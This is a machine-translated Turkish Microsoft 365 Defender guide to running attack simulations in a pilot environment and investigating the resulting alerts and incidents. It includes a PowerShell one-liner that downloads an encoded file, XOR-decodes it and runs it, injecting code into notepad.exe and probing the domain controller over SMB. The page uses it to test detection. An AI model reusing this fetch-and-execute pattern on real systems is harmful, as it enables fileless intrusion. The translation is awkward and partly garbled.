---
title: Pilot ortamda saldırı benzetimi Microsoft 365 Defender çalıştırma
description: Uyarıların ve olayların nasıl Microsoft 365 Defender, öngörüler kazanıldı ve tehditlerin hızlı bir şekilde düzeltildiklerini görmek için saldırı benzetimleri çalıştırın.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 3712875579c7d157fe52a5e115d059fc88b4b6d7
ms.sourcegitcommit: bdd6ffc6ebe4e6cb212ab22793d9513dae6d798c
ms.translationtype: MT
ms.contentlocale: tr-TR
ms.lasthandoff: 03/08/2022
ms.locfileid: "63326503"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Pilot ortamda saldırı benzetimi Microsoft 365 Defender çalıştırma


Bu makale, pilot ortam kullanarak olayla ilgili bir soruşturma ve yanıtını gerçekleştirme sürecindeki Microsoft 365 Defender adım [2'dir](eval-defender-investigate-respond.md). Bu işlem hakkında daha fazla bilgi için genel bakış [makalesine](eval-defender-investigate-respond.md) bakın.

Pilot ortamınızı hazırlarken, sanal bir saldırıya sahip bir olay oluşturarak ve araştırma yapmak ve yanıtlamak için Microsoft 365 Defender portalını kullanarak Microsoft 365 Defender'in olay yanıtı ile otomatik soruşturma ve düzeltme özelliklerini [test](eval-defender-investigate-respond.md) etmek için zaman geldi.

Microsoft 365 Defender'daki bir olay, bir saldırının hikayesini ifade etmek için birbiriyle ilişkili uyarılar ve ilişkili veriler koleksiyonudur.

Microsoft 365 ve uygulamalar, şüpheli veya kötü amaçlı bir etkinlik algılayana kadar uyarılar oluşturabilir. Tek tek uyarılar tamamlanmış veya devam eden bir saldırı hakkında değerli ipuçları sağlar. Öte yandan, saldırılar genellikle cihazlar, kullanıcılar ve posta kutuları gibi farklı varlık türlerine karşı çeşitli teknikler kullanır. Sonuç, kiracınız içinde birden çok varlık için birden çok uyarıdır.

>[!Note]
>Güvenlik çözümlemesini ve olay yanıtını ilk kez görmüyorsanız, tipik bir [](first-incident-overview.md) çözümleme, düzeltme ve olay sonrası inceleme sürecinde rehberli bir tur için İlk olayınızı yanıtlama kılavuzuna bakın.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Microsoft 365 Defender portalı ile Microsoft 365 Defender benzetimini

Uygulama Microsoft 365 Defender, pilot ortamınıza sanal saldırılar oluşturmak için yerleşik özelliklere sahiptir:

- hakkında daha fazla Microsoft 365 Defender için saldırı benzetim Office 365 .[https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator)
  
  Microsoft 365 Defender portalında, Saldırı **benzetimi eğitimi & E-> E-posta Gönder'i seçin**.

- Saldırı öğreticileri ve & için Microsoft 365 Defender benzetimleri öğrenin[https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  Geçiş Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">, Uç Noktalar</a> **ve Öğreticiler ve >'& seçin**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Office 365 Saldırı benzetimi eğitimi için Defender

Office 365 için Defender, Microsoft 365 E5 için Microsoft Defender veya Office 365 Plan 2, kimlik avı saldırılarına yönelik saldırı benzetimi eğitimi içerir. Temel adımlar şöyledir:

1. Benzetim oluşturma

   Yeni benzetim oluşturma ve başlatma hakkında adım adım yönergeler için bkz. Kimlik avı [saldırılarını benzetimini başlatma](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Yük oluşturma

   Bir benzetim içinde kullanmak üzere nasıl yük oluştur adım adım yönergeler için bkz. Saldırı benzetimi eğitimi [için özel bir yük oluşturma](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. Öngörü kazanma

   Raporlamayla nasıl öngörü kazanıla ilgili adım adım yönergeler için bkz. Saldırı [benzetim eğitimi aracılığıyla içgörüler kazanma](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Daha fazla bilgi için bkz. [Benzetimler](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Uç nokta saldırı öğreticileri ve benzetimler & Defender

İşte Microsoft'un Uç Nokta benzetimleri için Defender:

- Belge Backdoor'a düşer
- Otomatik araştırma (backdoor)

Üçüncü taraf kaynaklardan başka benzetimler de vardır. Ayrıca öğreticiler de vardır.

Her benzetim veya öğretici için:

1. Sağlanan ilgili adım adım belgeyi indirin ve okuyun.

2. Benzetim dosyasını indirin. Dosyayı veya betiği test cihazına indirmeyi seçebilirsiniz, ancak bu zorunlu değildir.

3. Benzetim dosyasını veya betiği, adım adım belgede olduğu gibi test cihazında çalıştırın.

 Daha fazla bilgi için bkz[. Benzetimi yapılan saldırı aracılığıyla Endpoint için Microsoft Defender'ı deneyimle.](/microsoft-365/security/defender-endpoint/attack-simulations)

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Yalıtılmış bir etki alanı denetleyicisi ve istemci cihazı ile bir saldırıyı benzetim (isteğe bağlı)

Bu isteğe bağlı olay yanıt alıştırmasında, PowerShell betiği kullanarak yalıtılmış Bir Active Directory Etki Alanı Hizmetleri (AD DS) etki alanı denetleyicisine ve Windows cihazına yönelik saldırının benzetimini yapın, ardından olayı araştırın, düzeltmek ve giderin.

İlk olarak, pilot ortamınıza uç noktalar eklemeniz gerekir.

### <a name="add-pilot-environment-endpoints"></a>Pilot ortam uç noktaları ekleme

İlk olarak, pilot ortamınıza yalıtılmış bir AD DS etki alanı denetleyicisi Windows bir cihaz eklemeniz gerekir.

1. Pilot ortamı kiracının kiracının [etkiyi etkinleştirmiş Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Etki alanı denetleyicinizin:

   - Windows Server 2008 R2 veya sonraki bir sürümünü çalıştırır.
   - Kimlik için [Microsoft Defender'a raporlar](/azure/security-center/security-center-wdatp) ve uzaktan [yönetimi etkinleştirdi](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Kimlik [için Microsoft Defender ve Bulut Uygulamaları için Microsoft Defender tümleştirmesi etkindir](/cloud-app-security/mdi-integration) .
   - Test etki alanında bir test kullanıcısı oluşturulmuş olabilir. Yönetici düzeyinde izinler gerekli değildir.

3. Test cihazınızın doğru olduğunu doğrulayın:

   - 1903 Windows 10 sonraki bir sürümde çalışır.
   - AD DS etki alanı denetleyicisi etki alanına katıldı.
   - Etkin [Windows Defender Virüsten Koruma](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) var. E-Windows Defender Virüsten Koruma etkinleştirme konusunda sorun Windows Defender Virüsten Koruma bu sorun [giderme başlığına bakın](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Uç [Nokta için Microsoft Defender'a ekli olarak gönderilir](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Kiracı ve cihaz grupları kullanıyorsanız, test cihazı için ayrılmış bir cihaz grubu oluşturun ve bu grubu üst düzeye itin.

Alternatif olarak, AD DS etki alanı denetleyicinizi barındırabilirsiniz ve bu denetleyiciyi sanal makine olarak altyapı Microsoft Azure test edebilirsiniz. Sanal kurumsal Test Laboratuvarı [Kılavuzu'nın Aşama 1'inde](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet) yer alan yönergeleri kullanabilirsiniz, ancak APP1 sanal makinesi oluşturma aşamasını atlayabilirsiniz.

İşte sonuç.

![Sanal kurumsal Test Laboratuvarı Kılavuzu kullanılarak Defender değerlendirme ortamınız için uç noktalar.](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png)

Algılamadan gizlemek için gelişmiş tekniklerden yararlanan gelişmiş bir saldırının benzetimini kullanırsiniz. Saldırı, etki alanı denetleyicilerinde açılan Sunucu İleti Bloğu (SMB) oturumlarını numaralara alır ve kullanıcıların cihazlarının son IP adreslerini alır. Bu saldırı kategorisi genellikle saldırının cihazında bırakılan dosyaları içermemektedir ve yalnızca bellekte yer almaktadır. Var olan sistem ve yönetim araçlarını kullanarak "karadan canlı" çıkarlar ve yürütmelerini gizlemek için kodlarını sistem işlemlerine sunarlar. Bu tür davranış, cihazda algılamayı geri alamalarına ve kalıcılıklarını sağlar.

Bu benzetimde, örnek senaryomuz bir PowerShell betiğiyle başlar. Gerçek dünyada, bir kullanıcı bir betik çalıştırmaya kandırıldı olabilir veya betik, daha önce virüs bulan bir cihazla uzak bir bilgisayardan çalıştırabilir ve bu da saldırganin ağda sonraki bir yere taşınmaya çalışıyor olduğunu gösterir. Yöneticiler ayrıca, çeşitli yönetim etkinliklerini çalıştırmak için betikleri çoğunlukla uzaktan çalıştıracakları için bu betikleri algılamak zor olabilir.

![İşlem ekleme ve SMB keşif saldırı diyagramıyla dosyasız PowerShell saldırı.](../../media/mtp/mtpdiydiagram.png)

Benzetim sırasında saldırı, görünüşe göre devam ediyor gibi görünen bir süreç için kabuk kodu eklemeye başladı. Bu senaryo için kullanıcı kimlik notepad.exe. Bu işlemi benzetim için seçtik, ancak saldırganlar büyük olasılıkla sistem süreci gibi uzun vadeli bir sistemi hedef svchost.exe. Ardından kabukkodu, devam nasıl devam edecek yönergeleri almak için saldırganın komut ve denetim (C2) sunucusuna gider. Betik, etki alanı denetleyicisine (DC) yönelik reconnaissance sorguları yürütmeye çalışır. Reconnaissance, bir saldırganın son kullanıcı oturum açma bilgileri hakkında bilgi edinsına olanak sağlar. Saldırganlar bu bilgilere sahip olduktan sonra belirli bir hassas hesaba almak için ağlarında sonraki adımlara da devam eder

> [!IMPORTANT]
> En iyi sonuçları elde etmek için saldırı benzetim yönergelerini mümkün olduğunca yakından izleyin.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Yalıtılmış AD DS etki alanı denetleyicisi saldırı benzetimlerini çalıştırma

Saldırı senaryosu benzetimunu çalıştırmak için:

1. Pilot ortamınıza yalıtılmış AD DS etki alanı denetleyicisini ve her Windows emin olun.

2. Test cihazında test kullanıcı hesabıyla oturum açın.

3. Test Windows PowerShell bir sayfa penceresi açın.

4. Aşağıdaki benzetim betiği kopyalayın:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Bu makaleyi bir web tarayıcısında açarsanız, bazı karakterleri kaybetmeden veya fazladan satır sonları eklemeden metnin tamamını kopyalamada sorunlarla karşılaşabilirsiniz. Böyle bir durumda, bu belgeyi indirin ve Adobe Reader'da açın.

5. Kopyalanan betiği PowerShell penceresinde yapıştırın ve çalıştırın.

> [!NOTE]
> PowerShell'i uzak masaüstü protokolünü (RDP) kullanarak kullanıyorsanız, RDP istemcisinde Pano Metni Yaz komutunu kullanın, çünkü **CTRL-V** kısayol tuşu veya sağ tıklama yapıştırma yöntemi çalışmıyor olabilir. PowerShell'in son sürümleri de bazen bu yöntemi kabul etmez; önce bellekte Not Defteri'e kopyalamanız, sanal makineye kopyalamanız ve sonra da PowerShell'e yapıştırmanız gerekir.

Birkaç saniye sonra, Not Defteri uygulaması açılır. Sanal bir saldırı kodu bu koda Not Defteri. Tam senaryoyu deneyim Not Defteri için, otomatik olarak oluşturulan Not Defteri örneğini açık tutabilirsiniz.

Sanal saldırı kodu, bir dış IP adresine (C2 sunucusunu simüle eder) iletişim kurmaya ve ardından SMB aracılığıyla etki alanı denetleyicisine karşı mutabıklık kurmaya çalışacak.

Bu komut dosyası tamamlandığında PowerShell konsolunda bu iletiyi görüyorsunuz:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Otomatik Olay ve Yanıt özelliğinin nasıl çalıştığını görmek için, otomatik notepad.exe açık tutabilirsiniz. Otomatik Olay ve Yanıt'ın Otomatik Olay'ın otomatik işlem Not Defteri görüyorsunuz.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Benzetimi yapılan saldırının olayın araştırılması

> [!NOTE]
> Bu benzetimde size yol başlamadan önce, olay yönetiminin araştırma sürecinin bir parçası olarak ilgili uyarıları bir araya almanıza nasıl yardımcı olduğunu, portalda nerede bu şekilde bulunasınız ve güvenlik işlemleriniz içinde size nasıl yardımcı olduğunu görmek için aşağıdaki videoyu izleyin:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Görünüm soc analisti noktasına geçiş yapmak, artık portalda saldırıyı Microsoft 365 Defender başlayabilirsiniz.

1. Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">açın</a>.

2. Gezinti bölmesinde, Olayları ve **Olayları &'> seçin**.

3. Benzetimi yapılan saldırının yeni olayı olay sırasında görünür.

    ![Olay sırası örneği.](../../media/mtp/fig2.png)

#### <a name="investigate-the-attack-as-a-single-incident"></a>Saldırıyı tek bir olay olarak araştırma

Microsoft 365 Defender analizlerle ilgili tüm uyarıları ve soruşturmaları tek bir olay varlığında bir araya toplar. Bunu yaparak, Microsoft 365 Defender bir saldırı anlatısı gösterir ve SOC analisti'nin karmaşık tehditleri an anlamalarına ve bu tehditlere yanıt vermelerine olanak sağlar.

Bu benzetim sırasında oluşturulan uyarılar aynı tehditle ilişkilendirilmiştir ve bunun sonucunda otomatik olarak tek bir olay olarak toplanır.

Olayı görüntülemek için:

1. Microsoft 365 Defender <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">açın</a>.

2. Gezinti bölmesinde, Olayları ve **Olayları &'> seçin**.

3. Olay adının sol tarafından bulunan daireye tıklayarak en yeni öğeyi seçin. Yan panelde, ilgili tüm uyarılar da dahil olmak üzere olay hakkında ek bilgiler görüntülenir. Her olayın, içinde yer alan uyarıların özniteliklerine göre olayı açıklayan benzersiz bir adı vardır.

   Panoda gösterilen uyarılar hizmet kaynaklarına göre filtre kullanılabilir: Kimlik için Microsoft Defender, Bulut Uygulamaları için Microsoft Defender, Uç Nokta için Microsoft Defender, Microsoft 365 Defender ve Office 365 için Microsoft Defender.

3. Olay **hakkında daha fazla bilgi** almak için Olay sayfasını aç'ı seçin.

   Olay **sayfasında** , olayla ilgili tüm uyarıları ve bilgileri görebilirsiniz. Bu bilgiler uyarıya katılan varlıkları ve varlıkları, uyarıların algılama kaynağını (Kimlik için Microsoft Defender veya Uç Nokta için Microsoft Defender gibi) ve bunların bağlantılarının nedenini içerir. Olay uyarı listesinin gözden geçirmesi saldırının ilerlemesini gösterir. Bu görünümde, tek tek uyarıları görebilir ve araştırabilirsiniz.

   Ayrıca sağ menüde **Olayı** yönet'e tıklar, olayı etiketlir, kendinize atayır ve açıklamalar ekleyebilirsiniz.

#### <a name="review-generated-alerts"></a>Oluşturulan uyarıları gözden geçirme

Benzetimi yapılan saldırı sırasında oluşturulan uyarılardan bazılarına bakalım.

> [!NOTE]
> Benzetimi yapılan saldırı sırasında oluşturulan uyarılardan yalnızca birkaçı için size yoleceğiz. Test aygıtınızda çalışan Windows Microsoft 365 Defender sürümüne bağlı olarak, biraz farklı bir sırada görünen daha fazla uyarıyla karşınıza çıkabilir.

![Oluşturulan uyarılar örneği.](../../media/mtp/fig6.png)

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Uyarı: Şüpheli işlem eklemesi gözlemlendi (Kaynak: Uç Nokta için Microsoft Defender)

Gelişmiş saldırganlar, bellekte kalıcı olmak ve algılama araçlarından gizlemek için gelişmiş ve gizli yöntemler kullanır. Yaygın tekniklerden biri, kötü amaçlı yürütülebilir dosyalar yerine güvenilen bir sistem sürecinden çalışarak, kötü amaçlı kodu algılama araçlarını ve güvenlik işlemlerini zor hale etmektir.

SOC analistlerinin bu gelişmiş saldırılara yakalamasına olanak sağlamak için, Uç Nokta için Microsoft Defender'daki derin bellek algılayıcıları çeşitli süreç kod ekleme tekniklerinin göz alıcı görünürlüğünü sağlayan bulut hizmetimizi sunar. Aşağıdaki şekilde, uç nokta için Defender'ın bu kod ekleme girişimiyle nasıl algılandı ve <i>notepad.exe. </i>

![Kötü amaçlı olabilecek kod ekleme uyarısı örneği.](../../media/mtp/fig7.png)

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Uyarı: İşlem tarafından gözlemlenen beklenmedik davranış, komut satırı bağımsız değişkeni yok olarak çalıştırıldı (Kaynak: Uç Nokta için Microsoft Defender)

Uç nokta algılamaları için Microsoft Defender genellikle bir saldırı tekniğinin en yaygın özniteliğini hedefler. Bu yöntem, dayanıklılığı sağlar ve saldırganların yeni taktiklere geçiş çubuklarını artırır.

Kuruluş içindeki ve dünya genelinde ortak süreçlerin normal davranışını oluşturmak için büyük ölçekli öğrenme algoritmaları kullanır ve bu süreçlerin anormal davranışlar göstermelerini izleriz. Bu anormal davranışlar genellikle fazladan kod ekli olduğunu ve başka herhangi bir güvenilir işlemde çalıştırıı olduğunu ortaya söylüyor.

Bu senaryo için, işlem <i>notepad.exe</i> bir dış konumla iletişimi içeren anormal davranışı sergilemektedir. Bu sonuç, kötü amaçlı kodun tanıtımını yapmak ve yürütmek için kullanılan belirli bir yöntemden bağımsızdır.

> [!NOTE]
> Bu uyarı, ek arka uç işleme gerektiren makine öğrenme modellerine dayandırıldı olduğundan, bu uyarıyı portalda görmenin biraz zaman al saati olabilir.

Uyarı ayrıntılarının dış IP adresini (araştırmayı genişletmek için özet olarak kullanabileceğiniz bir gösterge) içermesi dikkat edin.

IP adresi ayrıntıları sayfasını görüntülemek için uyarı işlemi ağacında IP adresini seçin.

![Komut satırı bağımsız değişkeni yoktur ve bir işlem tarafından beklenmeyen davranış uyarısı örneği.](../../media/mtp/fig8.png)

Aşağıdaki şekilde seçili IP Adresi ayrıntıları sayfası görüntülenir (Uyarı işlemi ağacında IP adresine tıklama).

![IP adresi ayrıntıları sayfası örneği.](../../media/mtp/fig9.png)

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Uyarı: Kullanıcı ve IP adresi uyumlulaştırma (SMB) (Kaynak: Kimlik için Microsoft Defender)

Sunucu İleti Bloğu (SMB) protokolünün kullanımı, saldırganların belirli bir hassas hesaba erişmek için daha sonra ağ içinde daha sonra hareket etmelerine yardımcı olan son kullanıcı oturum açma bilgilerini ağına ulaşabilmesini sağlar.

Bu algılamada, etki alanı denetleyicisinde SMB oturumu numaralama işlemi çalıştırlendiğinde bir uyarı tetiklenir.

![Kullanıcı ve IP adresinin uyumlulaştırması için Kimlik uyarısı için Microsoft Defender örneği.](../../media/mtp/fig10.png)

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Uç Nokta için Microsoft Defender ile cihaz zaman çizelgesini gözden geçirme

Bu olayda çeşitli uyarıları keşfettikten sonra, daha önce araştırılan olay sayfasına geri gidin. Uç Nokta **için** Microsoft Defender ve Kimlik için Microsoft Defender tarafından bildirilen bu olaya dahil olan cihazları gözden geçirmek için olay sayfasında Cihazlar sekmesini seçin.

Saldırının yürütül olduğu cihazın adını seçerek ilgili cihazın varlık sayfasını açın. Bu sayfada, tetiklenen uyarıları ve ilgili olayları görebilirsiniz.

Cihaz zaman **çizelgesini** açmak ve cihazda gözlemlenen tüm olay ve davranışları, uyarılar yükseltilmiş olarak kronolojik sırada görüntülemek için Zaman Çizelgesi sekmesini seçin.

![Davranışlarla birlikte cihaz zaman çizelgesi örneği.](../../media/mtp/fig11.png)

Daha ilginç davranışlardan bazılarının genişletilmesi, işlem ağaçları gibi yararlı ayrıntılar sağlar.

Örneğin, Şüpheli işlem eklemesi gözlemlenen uyarı **olayına gelene kadar aşağı kaydırın**. Yan **powershell.exe Olay varlıkları notepad.exe** bu davranışın tam işlem ağacını görüntülemek için, altındaki süreç olayına eklemek istediğinizpowershell.exe nı seçin. Gerekirse filtreleme için arama çubuğunu kullanın.

![Seçili PowerShell dosya oluşturma davranışı için işlem ağacı örneği.](../../media/mtp/fig12.png)

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Bulut Uygulamaları için Microsoft Defender ile kullanıcı bilgilerini gözden geçirme

Olay sayfasında, saldırıya **katılan kullanıcıların** listesini görüntülemek için Kullanıcılar sekmesini seçin. Tabloda, her kullanıcının Araştırma Önceliği puanı da dahil olmak üzere, her kullanıcı **hakkında ek bilgiler** yer alır.

Kullanıcının daha fazla araştırmanın yürütül olduğu profil sayfasını açmak için kullanıcı adını seçin. [Riskli kullanıcıları araştırma hakkında daha fazla makale okuyun](/cloud-app-security/tutorial-ueba#identify).

![Bulut Uygulamaları için Defender kullanıcı sayfası örneği.](../../media/mtp/fig13.png)

#### <a name="automated-investigation-and-remediation"></a>Otomatik araştırma ve düzeltme

> [!NOTE]
>Bu benzetimde size yol bulmadan önce, otomatik öz güvenin ne olduğunu, portalda nerede bulunsa ve güvenlik işlemlerinize nasıl yardımcı olduğunu bulmak için aşağıdaki videoyu izleyin:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Portalda olayla ilgili Microsoft 365 Defender gidin. Olay **sayfasındaki** **Soruşturmalar sekmesi** , Kimlik için Microsoft Defender ve Uç Nokta için Microsoft Defender tarafından tetiklenen otomatik soruşturmaları gösterir. Aşağıdaki ekran görüntüsünde yalnızca Uç Nokta için Defender tarafından tetiklenen otomatik araştırma görüntülenir. Varsayılan olarak, Uç Nokta için Defender kuyrukta bulunan yapıları otomatik olarak yeniden ayarlar ve bu da düzeltme gerektirir.

![Olayla ilgili otomatik soruşturma örneği.](../../media/mtp/fig14.png)

Araştırma ayrıntıları sayfasını açmak için araştırmayı tetikleyen **uyarıyı** seçin. Aşağıdaki ayrıntıları burada görüyorsunuz:

- Otomatik araştırmayı tetikleyen uyarılar.
- Etkide olan kullanıcılar ve cihazlar. Göstergeler başka cihazlarda bulunursa, bu ek cihazlar da listelenir.
- Kanıt listesi. Dosyalar, süreçler, hizmetler, sürücüler ve ağ adresleri gibi bulunan ve çözüm bulunan varlıklar. Bu varlıklar, uyarıyla ilgili olası ilişkileri inceler ve bunları kötü amaçlı veya kötü amaçlı olarak derecelendiler.
- Tehdit bulundu. Araştırma sırasında bulunan bilinen tehdit.

> [!NOTE]
> Zamanlamaya bağlı olarak, otomatik araştırma hala çalışıyor olabilir. Kanıtı toplayıp çözümlemeden ve sonuçları gözden geçirmeden önce, işleminin tamamlanması için birkaç dakika bekleyin. En son **bulguları elde etmek** için Araştırma ayrıntıları sayfasını yenileyin.

![Araştırma ayrıntıları sayfası örneği.](../../media/mtp/fig15.png)

Otomatik araştırma sırasında, Uç Nokta için Microsoft Defender notepad.exe düzeltme gerektiren yapılardan biri olarak ekli olan kimlik düzeltme işlemini tanımlanır. Uç Nokta için Defender otomatik düzeltmenin bir parçası olarak şüpheli işlem ekleme işlemini otomatik olarak durdurur.

Test <i>notepad.exeçalıştırma </i> işlemleri listesinden nasıl kaybolacaklarını görüyorsunuz.

#### <a name="resolve-the-incident"></a>Olayı çözme

Araştırma tamamlandıktan ve düzeltilen onaylandıktan sonra olayı çözersiniz.

Olay sayfasında **Olayı** **yönet'i seçin**. Durumu Olayı çöz olarak **ayarlayın ve** belirleme için **sınıflandırma ve** Güvenlik testi **için Doğru** uyarı'yi seçin.

![Olayı çözebilirsiniz açık Olay panelini yönet ile olay sayfası örneği.](../../media/mtp/fig16.png)

Olay çöz çöz olduğunda, proje portalında ve ilgili portallarda Microsoft 365 Defender tüm uyarıları çözer.

Bu, olay çözümlemesi, otomatik soruşturma ve olay çözümü için saldırı benzetimlerini tamamlar.

## <a name="next-step"></a>Sonraki adım

[![Olay Microsoft 365 Defender özelliklerini deneyin.](../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png)](eval-defender-investigate-respond-additional.md)

Adım 2/ 2: [Olay Microsoft 365 Defender özelliklerini deneyin](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Gezintiye ihtiyacınız olabilir

[Değerlendirme Microsoft 365 Defender Oluşturma](eval-create-eval-environment.md)
